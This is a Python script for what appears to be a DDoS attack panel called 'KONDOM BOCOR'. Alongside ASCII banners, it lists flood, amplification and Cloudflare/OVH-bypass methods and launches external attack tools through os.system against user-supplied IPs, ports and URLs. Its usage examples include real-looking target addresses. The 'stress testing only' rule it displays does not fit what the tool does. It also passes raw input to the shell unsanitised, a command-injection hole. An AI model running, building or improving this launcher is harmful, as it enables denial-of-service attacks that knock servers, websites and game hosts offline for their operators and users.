#TEAM ANONYOMOUS
#WE ARE INDONESIA

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''

\x1b[38;5;199m           　　　   /)
\x1b[38;5;199m           　　   _(⌒)＿　　/)
\x1b[38;5;199m           　 ／ / ﾉ　 ヽ /ﾋE)
\x1b[38;5;199m              `/ｲ// /LLﾄLL|/ /
\x1b[38;5;199m              ｜|/ /(6　6(/ /
\x1b[38;5;199m              ｜/_/ " ヮ"ﾉ_/
\x1b[38;5;199m             /Y　ﾚ `ーイ /
\x1b[38;5;199m             ﾚ|　ヽ-====-＼
\x1b[38;5;199m             ﾚヽ　/／^^＼^^＼
\x1b[38;5;199m              　 ＼ｿ 　　 |•　|•
\x1b[38;5;199m               　　 )ヽ＿／＿／
\x1b[38;5;199m               　 ／　　 ﾉ 
\x1b[38;5;199m                (    v   /
\x1b[38;5;199m                 \       \   

    ''')
    time.sleep(0.10)
    clear()
    print(f'''

     \x1b[38;5;199m  ▒█░░░▄░░▒█░▐█▀▀▒██░░░░▐█▀█▒▐█▀▀█▌▒▐██▄▒▄██▌░▐█▀▀
     \x1b[38;5;199m  ▒█░░▒█░░▒█░▐█▀▀▒██░░░░▐█──▒▐█▄▒█▌░▒█░▒█░▒█░░▐█▀▀
     \x1b[38;5;199m  ░▒▀▄▀▒▀▄▀░░▐█▄▄▒██▄▄█░▐█▄█▒▐██▄█▌▒▐█░░░░▒█▌░▐█▄▄

    ''')
    time.sleep(0.7)
    clear()
    print(f'''

    \x1b[38;5;199m  ▒█▀█▀█▒▐█▀▀█▌
    \x1b[38;5;199m  ░░▒█░░▒▐█▄▒█▌
    \x1b[38;5;199m  ░▒▄█▄░▒▐██▄█▌     

    ''')
    time.sleep(0.7)
    clear()
    print(f"""

    \x1b[38;5;199m  ▒▐█▒▐▀▒▐█▀▀█▌▒██▄░▒█▌░▐█▀█▄▒▐█▀▀█▌▒▐██▄▒▄██▌
    \x1b[38;5;199m  ▒▐██▌░▒▐█▄▒█▌▒▐█▒█▒█░░▐█▌▐█▒▐█▄▒█▌░▒█░▒█░▒█░ 
    \x1b[38;5;199m  ▒▐█▒▐▄▒▐██▄█▌▒██░▒██▌░▐█▄█▀▒▐██▄█▌▒▐█░░░░▒█▌
 
       """)
    time.sleep(0.7)
    clear()

def si():
    print('         \x1b[38;5;199m[ \x1b[38;5;255mK-B \x1b[38;5;199m] | \x1b[38;5;255mWelcome to KONDOM BOCOR \x1b[38;5;199m| \x1b[38;5;255mBy: ANsuper \x1b[38;5;199m| \x1b[38;5;255mUpdate v2.0')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;5;199m╔═══════════════╗
                                \x1b[38;5;199m══════╩══════╦════════╩═══════════════╗
                \x1b[38;5;199m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;5;199m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;5;199m║
                \x1b[38;5;199m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;5;199m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;199m║  
                \x1b[38;5;199m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;5;199m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;5;199m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;5;199m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;5;206m╔═══════════════╗
                                \x1b[38;5;206m║     \x1b[38;5;206mBanners   \x1b[38;5;206m║
                \x1b[38;5;206m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;5;206m║  \x1b[38;2;0;255;255mtroll               \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;206m║
                \x1b[38;5;206m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;206m║  
                \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;206m║
                \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;206m║
                \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;5;206m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;5;206m║
                \x1b[38;5;206m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;5;199m╔═══════════════╗
                                \x1b[38;5;199m║     \x1b[38;5;206mRULES     \x1b[38;5;199m║
                \x1b[38;5;199m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;199m║ \x1b[38;5;206m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m4. Only attack stress testing servers         \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m5. Don't skid the panel                       \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m6. Give a star to the github repository       \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m7. The creator does not do any harm           \x1b[38;5;199m║
                \x1b[38;5;199m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;5;199m╔═══════════════╗
                                \x1b[38;5;199m║     \x1b[38;5;206mPORTS     \x1b[38;5;199m║
                \x1b[38;5;199m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;199m║ \x1b[38;5;206m21 - \x1b[38;5;206mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;5;206mTFTP      \x1b[38;5;206m5060  - \x1b[38;5;206mmRIP  \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m22 - \x1b[38;5;206mSSH        \x1b[38;5;206m80   - \x1b[38;5;206mHTTP      \x1b[38;5;206m30120 - \x1b[38;5;206mFIVEM\x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m23 - \x1b[38;5;206mTELNET     \x1b[38;5;206m443  - \x1b[38;5;206mHTTPS                  \x1b[38;5;199m║   
                \x1b[38;5;199m║ \x1b[38;5;206m25 - \x1b[38;5;206mSMTP       \x1b[38;5;206m3074 - \x1b[38;5;206mXBOX                   \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;2;0;212;14m53 - \x1b[38;5;206mDNS        \x1b[38;5;206m5060 - \x1b[38;5;206mPLAYSATION             \x1b[38;5;199m║
                \x1b[38;5;199m║ \x1b[38;5;206m25 - \x1b[38;5;206mMINECRAFT       \x1b[38;5;206m25565 - \x1b[38;5;206mMINECRAFT        \x1b[38;5;199m║
                \x1b[38;5;199m╚═══════════════════════════════════════════════╝
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;5;199m╔═══════════════╗
                                \x1b[38;5;199m║    \x1b[38;5;199mSPECIALE    \x1b[38;5;206m║
                \x1b[38;5;199m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;5;199m║  \x1b[38;5;225mstress              \x1b[38;5;199m║  \x1b[38;5;206m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m║  \x1b[38;5;206m<empty>             \x1b[38;5;199m║  \x1b[38;5;206m<empty>               \x1b[38;5;199m║  
                \x1b[38;5;199m║  \x1b[38;5;206m<empty>             \x1b[38;5;199m║  \x1b[38;5;206m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m║  \x1b[38;5;206m<empty>             \x1b[38;5;199m║  \x1b[38;5;206m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m║  \x1b[38;5;206m<empty>             \x1b[38;5;199m║  \x1b[38;5;206m<empty>               \x1b[38;5;199m║
                \x1b[38;5;199m╚══════════════════════╩════════════════════════╝
''')
    
def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;5;199m╔═══════════════╗
                              \x1b[38;5;199m║    \x1b[38;5;199mLAYER 7    \x1b[38;5;199m║
               \x1b[38;5;199m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;5;199m║   \x1b[38;5;255mhttp-raw            \x1b[38;5;199m║   \x1b[38;5;255mcrash             \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mhttp-socket         \x1b[38;5;199m║   \x1b[38;5;255mhttpflood         \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mhttp-storm          \x1b[38;5;199m║   \x1b[38;5;255mcf-socket         \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mhttp-rand           \x1b[38;5;199m║   \x1b[38;5;255mcf-pro            \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255moverflow            \x1b[38;5;199m║   \x1b[38;5;255mhyper             \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mcf-bypass           \x1b[38;5;199m║   \x1b[38;5;255mslow              \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255muambypass           \x1b[38;5;199m║   \x1b[38;5;255mhttps-spoof       \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255movh-raw             \x1b[38;5;199m║   \x1b[38;5;255movh-beam          \x1b[38;5;199m║
               \x1b[38;5;199m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;5;199m╔═══════════════╗
                              \x1b[38;5;199m║    \x1b[38;5;255mLAYER 4    \x1b[38;5;199m║
               \x1b[38;5;199m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;5;199m║   \x1b[38;5;255mudp                 \x1b[38;5;199m║   \x1b[38;5;255mtcp               \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mnfo-killer          \x1b[38;5;199m║   \x1b[38;5;255mstd               \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mudpbypass           \x1b[38;5;199m║   \x1b[38;5;255mdestroy           \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mhome                \x1b[38;5;199m║   \x1b[38;5;255mgod               \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mslowloris           \x1b[38;5;199m║   \x1b[38;5;255mflux              \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mstdv2               \x1b[38;5;199m║   \x1b[38;5;255m<empty>           \x1b[38;5;199m║
               \x1b[38;5;199m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;5;199m╔═══════════════╗
                              \x1b[38;5;199m║\x1b[38;5;199m AMP's \x1b[38;5;199m/ \x1b[38;5;199mGames \x1b[38;5;199m║
               \x1b[38;5;199m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;5;199m║   \x1b[38;5;255movh-amp             \x1b[38;5;199m║   \x1b[38;5;255movh-amp           \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255mminecraft           \x1b[38;5;199m║   \x1b[38;5;255mstd               \x1b[38;5;199m║
               \x1b[38;5;199m║   \x1b[38;5;255msamp                \x1b[38;5;199m║   \x1b[38;2;0;255;255mldap              \x1b[38;5;206m║
               \x1b[38;5;199m║   \x1b[38;5;206m<empty>             \x1b[38;5;199m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;5;199m║
               \x1b[38;5;199m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"         \x1b]2; KONDOM BOCOR --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;5;199m[ \x1b[38;5;255mWelcome To KONDOM BOCOR powered by kajili-jili project official\x1b[38;5;199m ]')
    print("")
    print("""
              
          \x1b[38;5;199moooooooooo.    .oooooo.     .oooooo.     .oooooo.   ooooooooo.   
          \x1b[38;5;199m`888'   `Y8b  d8P'  `Y8b   d8P'  `Y8b   d8P'  `Y8b  `888   `Y88. 
          \x1b[38;5;199m 888     888 888      888 888          888      888  888   .d88' 
          \x1b[38;5;199m 888oooo888' 888      888 888          888      888  888ooo88P'  
          \x1b[38;5;199m 888    `88b 888      888 888          888      888  888`88b.    
          \x1b[38;5;199m 888    .88P `88b    d88' `88b    ooo  `88b    d88'  888  `88b.  
          \x1b[38;5;199mo888bood8P'   `Y8bood8P'   `Y8bood8P'   `Y8bood8P'  o888o  o888o 
                                                                                                                                     
\x1b[38;5;200m                           A project by Ansuper v2.0 Private           
\x1b[38;5;136m                                   Special Thanks to          

\x1b[38;5;196m          G       A       R       N       E      S     I       A      -  ID
\x1b[38;5;196m          G      A      N     O     S      E      C      T      E    A    M
\x1b[38;5;196m          G  A     R     U    D     A    S    E    C    U    R    Y   T   I
\x1b[38;5;196m          L     O      V    E    S    I   D   E.    I    N     S    I   D E 
\x1b[38;5;225m          L  E   G   I   O  N    7   H    a     c  k  e  r   s  T   E   A M
\x1b[38;5;225m          L U  I  Z  S   E   C  U  R   I  T   Y    A    G    E    N   C   Y
\x1b[38;5;225m          F   R    O   M    L    A    M    M   E  R   T  O    M   A  S  T A
\x1b[38;5;225m          H     A      C     K     T     I     V    I  S   I N D O N E S IA 


""")
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;5;162m×•×•× ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('MOD BY ANsuper    ▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀MOD BY ANsuper⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀FINAL UPDATE⠀ ⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
